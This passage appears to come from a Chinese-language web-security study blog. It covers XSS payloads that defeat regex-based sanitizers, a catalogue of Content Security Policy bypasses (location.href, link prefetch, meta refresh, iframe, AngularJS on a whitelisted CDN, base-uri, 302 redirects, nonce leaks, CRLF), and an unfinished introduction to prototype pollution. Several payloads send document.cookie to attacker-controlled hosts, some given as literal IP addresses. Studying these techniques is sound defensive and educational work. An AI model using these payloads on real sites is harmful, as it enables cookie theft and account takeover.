<p>即使改成非贪婪模式，删除掉的是第一个 <code>onload=</code> ，第二个 <code>onload=</code>  仍然会保留，所以无法解决问题，构造的 Payload 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;svg&gt;&lt;svg onload=onload=alert(1)&gt;&lt;/svg&gt;&lt;/svg&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>
<p>正则优化：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&lt;[A-Za-z][A-Za-z0-9-]*\s)([onload=]*))</span><br></pre></td></tr></table></figure>
<p>3. 字符匹配导致问题</p>
<p>如果这个正则匹配上 HTML 属性中的一个 <code>&gt;</code> ，则会停止向后匹配，这样 <code>onload=</code>  也能保留下来。Payload 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;svg x=&quot;&gt;&quot; onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<p>总结</p>
<p>1. 用户交互型</p>
<blockquote>
<p>svg use 属性，base64 编码，绕过 JavaScript 关键字</p>
<p>svg use 属性，charset=ISO-2022-jp，Chrome 忽略特定字符，导致 JavaScript 关键字消失</p>
</blockquote>
<p>2. 非用户交互型</p>
<blockquote>
<p>1. 条件竞争</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;svg onload&gt;</span><br><span class="line">&lt;detail ontoggle=alert(1)&gt; //在黑名单删除details标签前，就已经将ontoggle事件加载进事件队列中即使删除也会执行</span><br></pre></td></tr></table></figure>
<p>2. 绕过补丁</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.绕过贪婪匹配</span><br><span class="line">由于贪婪匹配一直会匹配到没有匹配的元素为止，利用两个onload，将会忽略第一个onlad</span><br><span class="line">&lt;svg&gt;&lt;svg onload=alert(1) onload=alert(2)&gt;</span><br><span class="line">2.绕过非贪婪匹配</span><br><span class="line">由于非贪婪只匹配第一个元素，导致第一个onload被删除，第二个onload得以保留</span><br><span class="line">&lt;p&gt;&lt;svg&gt;&lt;svg onload=onload=alert(1)&gt;&lt;/svg&gt;&lt;/svg&gt;&lt;/p&gt;</span><br><span class="line">3.字符匹配</span><br><span class="line">正则表达式遇到&gt;就结束</span><br><span class="line">&lt;svg&gt;&lt;svg x=&quot;&gt;&quot; onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="csp"><a class="markdownIt-Anchor" href="#csp">#</a> CSP</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDQwNDQwMjE3NTEtZDhmZmI2YTQtYzJhYi00YzRhLWE1N2YtMGQ1MDY2NDVmZWIyLm1k">📎CSP 常规绕过思路.md</span></p>
<p>CSP（Content Security Policy，内容安全策略），是网页应用中常见的一种安全保护机制，它实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，哪些不可以</p>
<p><strong>通过响应包头（Response Header）实现：</strong></p>
<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-policy</span>: <span class="keyword">default-src</span> <span class="string">&#x27;self&#x27;</span>; <span class="keyword">script-src</span> <span class="string">&#x27;self&#x27;</span> allowed.com; <span class="keyword">img-src</span> <span class="string">&#x27;self&#x27;</span> allowed.com; <span class="keyword">style-src</span> <span class="string">&#x27;self&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><strong>通过 HTML 元标签实现：</strong></p>
<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;<span class="keyword">default-src</span> <span class="string">&#x27;self&#x27;</span>; <span class="keyword">img-src</span> https://*; <span class="keyword">child-src</span> <span class="string">&#x27;none&#x27;</span>;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>除了 Content-Security-Policy，还有一个 Content-Security-Policy-Report-Only 字段，表示不执行限制选项，只是记录违反限制的行为。它必须与 report-uri 选项配合使用。</p>
<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy-Report-Only</span>: <span class="keyword">default-src</span> <span class="string">&#x27;self&#x27;</span>; ...; <span class="keyword">report-uri</span> /my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure>
<h3 id="csp指令值"><a class="markdownIt-Anchor" href="#csp指令值">#</a> CSP 指令值</h3>
<p>介绍完 CSP 的指令，下面介绍一下指令值，即允许或不允许的资源</p>
<blockquote>
<ul>
<li>*： 星号表示允许任何 URL 资源，没有限制；</li>
<li>self： 表示仅允许来自同源（相同协议、相同域名、相同端口）的资源被页面加载；</li>
<li>data：仅允许数据模式（如 Base64 编码的图片）方式加载资源；</li>
<li>none：不允许任何资源被加载；</li>
<li>unsafe-inline：允许使用内联资源，例如内联 <code>&lt;script&gt;</code>  标签，内联事件处理器，内联 <code>&lt;style&gt;</code>  标签等，但出于安全考虑，不建议使用；</li>
<li>nonce：通过使用一次性加密字符来定义可以执行的内联 js 脚本，服务端生成一次性加密字符并且只能使用一次；</li>
</ul>
</blockquote>
<p>下面通过具体的例子来看看 CSP 指令和指令值的用法：</p>
<blockquote>
<p><code>&lt;img src=image.jpg&gt;</code>  该图片来自<span class="exturl" data-url="aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz1zVml1bndJZVJJN3Z1TSUyRkhOR0NNcUElM0QlM0QuWEJKcDJWbUhSTEpkblE4SCUyQk1LbmZxS3JqampabEh6b0h1eXltTXB2VktRJTNE"> https://example.com</span> 将被允许载入，因为是同源资源；</p>
<p><code>&lt;script src=script.js&gt;</code>  该 js 脚本来自<span class="exturl" data-url="aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz13bXlvQ05zZnZhTVdUckxuZWREZkJRJTNEJTNELjBKWmNPNSUyRnowS1dOcWVlb0V1QWVVSXJsVVRmRFlwd3RUTGp0QlFUaXFEMCUzRA=="> https://example.com</span> 将被允许载入，因为是同源资源；</p>
<p><code>&lt;script src=https://examples.com/script.js&gt;</code> ，该 js 脚本将不允许被加载执行，因为来自<span class="exturl" data-url="aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz11NnE3QXR2M0t6RTFGbWtRaXJCeE1nJTNEJTNELjdQQm81JTJGWUs3bU5wSVZZNkUlMkZ0Z082ME5PZE1YUWlOUUtpeTBFbzZOUk9ZJTNE"> https://examples.com</span>， 非同源；</p>
</blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucnVhbnlpZmVuZy5jb20vYmxvZy8yMDE2LzA5L2NzcC5odG1s">Content Security Policy 入门教程 - 阮一峰的网络日志 (ruanyifeng.com)</span></p>
<p>CSP 绕过</p>
<p>1.location.href 绕过</p>
<p>服务端代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (!isset($_COOKIE[&#x27;a&#x27;])) &#123;</span><br><span class="line">        setcookie(&#x27;a&#x27;,md5(rand(0,1000)));</span><br><span class="line">    &#125;</span><br><span class="line">        header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;script-src &#x27;unsafe-inline&#x27;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSP-safe&lt;/h2&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">        echo &quot;Your GET content&quot;.@$_GET[&#x27;a&#x27;];</span><br><span class="line">    &#125;//</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>本地代码，模拟接收 cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if (isset($_GET[&#x27;xss&#x27;])) &#123;</span><br><span class="line">        echo &quot;Your GET content&quot;.@$_GET[&#x27;xss&#x27;];</span><br><span class="line">    &#125;//</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这个地方可以用 location 跳转：location.href (window.location/window.open) 绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=&lt;script&gt;location.href=&quot;http://127.0.0.1&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>在我们已经可以执行任意 js 脚本但由于 CSP 的阻拦我们的 cookie 无法带外传输，就可以用此方法，注意编码 %2B</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">location.href = &quot;vps_ip:xxxx?&quot;+document.cookie</span><br><span class="line">http://101.35.139.208:9999/csp.php?a=&lt;script&gt;location.href=&quot;http://127.0.0.1:18888/csp.php?xss=&quot;%2bdocument.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>利用前提：存在 XSS，可以执行任意 js 脚本，但由于 CSP 无法数据外带。</p>
<p>​					CSP 规则 <code>header(&quot;Content-Security-Policy: default-src 'self';script-src:'unsafe-inline';&quot;);</code></p>
<p>2.link 绕过 (失效)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- firefox --&gt;</span><br><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//$&#123;cookie&#125;.vps_ip&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- chrome --&gt;</span><br><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;//vps_ip?$&#123;cookie&#125;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>外带：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var link = document.createElement(&quot;link&quot;);</span><br><span class="line">link.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);</span><br><span class="line">link.setAttribute(&quot;href&quot;, &quot;//vps_ip/?&quot; + document.cookie);</span><br><span class="line">document.head.appendChild(link);</span><br></pre></td></tr></table></figure>
<p>3.meta 跳转绕过</p>
<p>与 link 标签原理相似，利用 meta 标签实现网页跳转</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/csp.php?xss=&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://150.158.188.194:7890/&quot; &gt;</span><br></pre></td></tr></table></figure>
<p>meta 可以控制缓存（在 header 没有设置的情况下），有时候可以用来绕过 CSP nonce。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;cache-control&quot; content=&quot;public&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>外带 cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var ometa = document.createElement(&quot;meta&quot;);</span><br><span class="line">ometa.setAttribute(&quot;http-equiv&quot;, &quot;refresh&quot;);</span><br><span class="line">ometa.setAttribute(&quot;content&quot;, &quot;1;url=127.0.0.1:18888/csp.php?xss=&quot;%2bdocument.cookie);</span><br><span class="line">document.head.appendChild(ometa);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>4.iframe 标签绕过</p>
<p><strong>同源</strong> ，当一个同源站点存在两个页面，我们称它们为 A 页面和 B 页面，假如 A 页面有 CSP 保护，而 B 页面没有，我们就可以直接在 B 页面新建 <code>iframe</code>  用 js 操作 A 页面的 DOM，也就是说 A 页面的 CSP 防护完全失效</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- A页面 --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if (!isset($_COOKIE[&#x27;a&#x27;])) &#123;</span><br><span class="line">        setcookie(&#x27;a&#x27;,md5(rand(0,1000)));</span><br><span class="line">    &#125;</span><br><span class="line">        header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">        echo &quot;Your GET content:&quot;.@$_GET[&#x27;a&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- B页面 --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">        echo &quot;Your GET content:&quot;.@$_GET[&#x27;a&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- 下面模拟XSS --&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var iframe = document.createElement(&#x27;iframe&#x27;);</span><br><span class="line">iframe.src=&quot;http://127.0.0.1/a.php&quot;;</span><br><span class="line">document.body.appendChild(iframe);</span><br><span class="line">setTimeout(()=&gt;alert(iframe.contentWindow.document.getElementById(&#x27;flag&#x27;).innerHTML),1000);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>前提条件：主站需要有 xss，需要拿到分站权限</p>
<p>5.CDN 绕过</p>
<p>通过白名单中的 cdn 存在漏洞绕过 CSP</p>
<p>hackmd CSP</p>
<p>该 md CSP 政策还允许了 <code>https://cdnjs.cloudflare.com/</code>  这个 js hosting 服务，这个提供了很多第三方的函数库以供引入，这样我们就可以直接借助 AngularJS 函数库以及 Client-Side Template Injection 里面成熟的沙盒逃逸技术绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- foo=&quot;--&gt;</span><br><span class="line">&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;div ng-app&gt;</span><br><span class="line">    &#123;&#123;constructor.constructor(&#x27;alert(document.cookie)&#x27;)()&#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">//sssss&quot; --&gt;</span><br></pre></td></tr></table></figure>
<p>6. 站点静态资源可控绕过</p>
<ul>
<li>存在可控静态资源</li>
<li>站点在 CSP 允许名单中</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://www.google-analytics.com&quot;&gt;</span><br><span class="line">&lt;script src=&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;&gt;&lt;/script&gt; </span><br></pre></td></tr></table></figure>
<p>7. 不完整 script 绕过</p>
<p>只适用于火狐，且只能<?php echo $_GET['xss']?> <script nonce='xxx××'>相邻可以用，通过不完整的 script 标签将后面的 nonce 变为自己的属性</p>
<p><code>http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1)</code></p>
<p><code>&lt;script</code>  就会被变成一个属性，值为空，之后的 <code>nonce='xxxxx'</code></p>
<p>会被当成我们输入的 script 标签中的一个属性</p>
<ul>
<li>可控点在合法 script 标签上方，且其中没有其他标签</li>
<li>XSS 页面的 CSP script-src 只采用了 nonce 方式</li>
</ul>
<p>需要将后面的没用内容注释，或者加到另一个属性中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1)//</span><br><span class="line">x http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1) 123=</span><br></pre></td></tr></table></figure>
<p>8. 不完整资源标签获取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#x27;self&#x27;;script-src &#x27;self&#x27;; img-src *;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&#x27;xss&#x27;]?&gt;</span><br><span class="line">&lt;h1&gt;flag&#123;0xffff&#125;&lt;/h1&gt;</span><br><span class="line">&lt;h2 id=&quot;id&quot;&gt;3&lt;/h2&gt;</span><br></pre></td></tr></table></figure>
<p>可以使用外联图片的 CSP，将 src 中内容延伸至下一个 &quot;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/csp.php?xss=&lt;img src=&quot;//vps_ip?a= </span><br></pre></td></tr></table></figure>
<p>baseuri 绕过</p>
<p>当网站设置了 script nonce， 在无法猜测 nonce 值的情况下，且 base-uri 没有被设置。</p>
<p>那么可以使用 <code>&lt;base&gt;</code>  标签将文档的基础 URI 修改为自己的服务器地址。</p>
<p>如下，需要本来文档就存在相对地址加载 js 的情况。最后 只要在自己服务器放上一个 123.js 就行了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-test&#x27;&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;base href=&quot;//xx.xx.xxx.xx:8888&quot;&gt;</span><br><span class="line">&lt;script nonce=&#x27;test&#x27; src=&quot;/123.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>302 跳转</p>
<p>网站都会带有一个 302 跳转功能的页面，用它来导向到本站的资源或者是外部的链接</p>
<p>如果我们的 script-src 设置为某个目录，通过这个目录下的 302 跳转，是可以绕过 csp 读取到另一个目录下的脚本的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">a/csp.php</span><br><span class="line">&lt;!-- csp.php --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"> header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;script-src http://127.0.0.1/a/&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"> &lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">     csp header test </span><br><span class="line"> &lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br><span class="line"> </span><br><span class="line">a/redirect.php</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location: &quot; . $_GET[url]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b/text.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"> &lt;title&gt;1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">123</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>csp 限制了 <code>/a/</code>  目录，而我们的目标脚本在 <code>/b/</code>  目录下则如果这时候请求 <code>redirect</code>  页面去访问 <code>/b/</code>  下的脚本是可以通过 csp 的检查的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/a/redirect.php?url=/b/test.php</span><br></pre></td></tr></table></figure>
<p>但这是有一个很严格的条件的，加载的资源所在的域必须和自身处于同域下 (<a href="http://example.com">example.com</a>)，也就是不可能通过 302 跳转去加载一个其他域下的脚本的，比如通过</p>
<p><code>a.com</code>  的 302 跳转去加载 <code>b.com</code>  下的脚本是不可以</p>
<p>在实际环境中，比如某个站调用某个 cdn，或者类似于 <code>script-src example.com/scripts/ google.com/recaptcha/</code> ， <code>google.com/script/*</code>  下有个 <code>evil.js</code> ，然后刚好站内有个重定向，漏洞条件就已经成立了。</p>
<ul>
<li>在 script-src 允许的域下，需要存在一个重定向的页面，这种页面大多存在于登陆，退出登录</li>
<li>在 script-src 允许的域下，存在某个任意文件的上传点（任意目录）</li>
<li>有特别的方式可以跨域发送请求，或者有站内域可以接受请求</li>
</ul>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzE1ODkyOC5odG1s">CSP 浅析与绕过 - SecPulse.COM | 安全脉搏</span></p>
</blockquote>
<p>CRLF 文件头</p>
<p>当一个页面存在 CRLF 漏洞时，且我们的可控点在 CSP 上方，就可以通过注入回车换行，将 CSP 挤到 HTTP 返回体中，这样就绕过了 CSP</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jbi1zZWMuY29tL2FyY2hpdmVzLzk0ODM2OC5odG1s">我的 CSP 绕过思路及总结 | CN-SEC 中文网</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDQwNDQwMTU3ODItOWQ2MWU1Y2EtYjViMy00ODE4LTg1OGQtMjJkODA4NWY0YzVmLm1k">📎通过浏览器缓存来 bypass CSP script nonce.md</span></p>
<p>条件</p>
<p>1. 开启缓存，nonce 保存在本地  <code>header( 'cache-Control: max-age=99999999 ' );</code></p>
<p>不能对页面发起请求，因为发起请求之后，后台就会刷新页面并刷新 nonce 的字符串</p>
<p>2. 有 document.write ，截断 href，只会保存 #前面的内容</p>
<p>3.textarea nonce，textarea 中只能容纳文本</p>
<p>4.ajax 无刷新</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=&#x27;&lt;?php echo $random;?&gt;&#x27;&gt;document.write(&#x27;URL &#x27; + unescape(location.href))&lt;/script&gt;&lt;script nonce=&#x27;&lt;?php echo $random;?&gt;&#x27;&gt;console.log(&#x27;another nonced script&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>然后我们需要利用 iframe 引入这个页面，并对其发起请求获取页面内容，这里我们通过向其中注入一个 <code>&lt;textarea&gt;</code>  标签来吃掉后面的 script 标签，这样就可以获取内容。</p>
<p>然后我们需要一个页面去获取 nonce 字符串，为了反复获得，这里需要开启 session。</p>
<p>唯一的问题就是在 nonce script 上，由于 csp 开启的问题，我们没办法自动实现自动提交，也就是攻击者必须要使按钮被点击，才能实现一次攻击。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221013171141247.png" alt="image-20221013171141247"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221013171233853.png" alt="image-20221013171233853"></p>
<h2 id="原型链污染"><a class="markdownIt-Anchor" href="#原型链污染">#</a> 原型链污染</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDQwNjM1MTI4NTYtNjJiY2JkYjAtZDI0ZS00NTc4LTlhZWMtOGM0ODlkN2U3OTQ1Lm1k">📎原型污染 - 并绕过客户端 HTML sanitizer.md</span></p>
<p>原型链特定于 JavaScript，它源于 JavaScript 继承模型，称为<strong>基于原型的继承</strong>，JavaScript 中的每个对象都有一个原型（也可以是 <code>null</code> ）。如果我们不指定它，默认情况下对象的原型是 <code>Object.prototype</code> ，通过 object.prototype 检查对象的属性。</p>
<p>当我们尝试访问对象的属性时，JS 引擎首先检查对象本身是否包含该属性。如果是，则将其退回。否则，JS 会检查原型是否具有该属性。如果没有，JS 会检查原型的原型…… 以此类推，直到原型为 <code>null</code> . 它被称为原型链。</p>
<p>如果我们能以某种方式<strong>污染 Object.prototype</strong>（即用新属性对其进行扩展），那么所有 JS 对象都会具有这些属性。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const user = &#123; userid: 123 &#125;;if (user.admin) &#123;  console.log(&#x27;You are an admin&#x27;);&#125;</span><br></pre></td></tr></table></figure>
<p>当前 user 没有 admin 的属性，但如果我们污染了 <code>Object.prototype</code>  和定义名为的属性 <code>admin</code> ，那么 <code>console.log</code>  将执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object.prototype.admin = true;const user = &#123; userid: 123 &#125;;if (user.admin) &#123;  console.log(&#x27;You are an admin&#x27;); // this will execute&#125;</span><br></pre></td></tr></table></figure>
<p>此漏洞的入口点通常是合并操作（即将一个对象的所有属性复制到另一个对象）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const obj1 = &#123; a: 1, b: 2 &#125;;</span><br><span class="line">recursiveMerge(obj1, obj2); </span><br><span class="line">递归合并的基本流程是：</span><br><span class="line">1. 遍历 obj2 的所有属性并检查它们是否存在于`obj1`.</span><br><span class="line">2. 如果存在属性，则对该属性执行合并操作。</span><br><span class="line">3. 如果属性不存在，则将其从 复制`obj2`到`obj1`。</span><br></pre></td></tr></table></figure>
<p>如果用户对要合并的对象有任何控制权，那么通常其中一个对象来自 <code>JSON.parse</code> . And <code>JSON.parse</code>  有点特别，因为它被视为 <code>__proto__</code> “普通” 属性，即没有作为原型访问器的特殊含义</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-3-1024x219.png" alt="img"></p>
